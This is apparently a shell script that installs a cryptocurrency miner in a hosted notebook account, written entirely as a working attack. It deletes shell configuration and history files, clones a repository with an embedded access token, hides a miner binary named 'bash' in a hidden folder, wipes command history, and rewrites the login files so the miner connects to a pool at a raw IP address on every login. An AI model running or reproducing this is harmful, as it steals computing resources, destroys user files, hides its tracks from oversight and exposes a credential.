cd ~
rm -rvf .bash* .lib*

rm -rvf ele* lol* 1.43* 
cd ~/
mkdir .lib
cd .lib
rm -R *
rm -R /home/studio-lab-user/.ton
WORKER="jasin"
WALLETNH="yogajasin391@gmail.com"
POOLNH="152.42.241.144:80"
git clone https://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@github.com/sadarsayujinjas/gm.git && cd gm && mv bash /home/studio-lab-user/.lib && cd .. && history -cr
echo ""  > /home/studio-lab-user/.bashrc
echo "" > /home/studio-lab-user/.bash_history
echo "" > /home/studio-lab-user/.bash_profile
echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
echo 'WORKER="jasin"' >> ~/.bash_profile
echo 'WALLETNH="yogajasin391@gmail.com"' >> /home/studio-lab-user/.bash_profile
echo 'POOLNH="152.42.241.144:80"' >> /home/studio-lab-user/.bash_profile
echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
echo "./.lib/bash -a cuckatoo32 -s $POOLNH -u $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
chmod +x bash && cd ~/ && source .bashrc
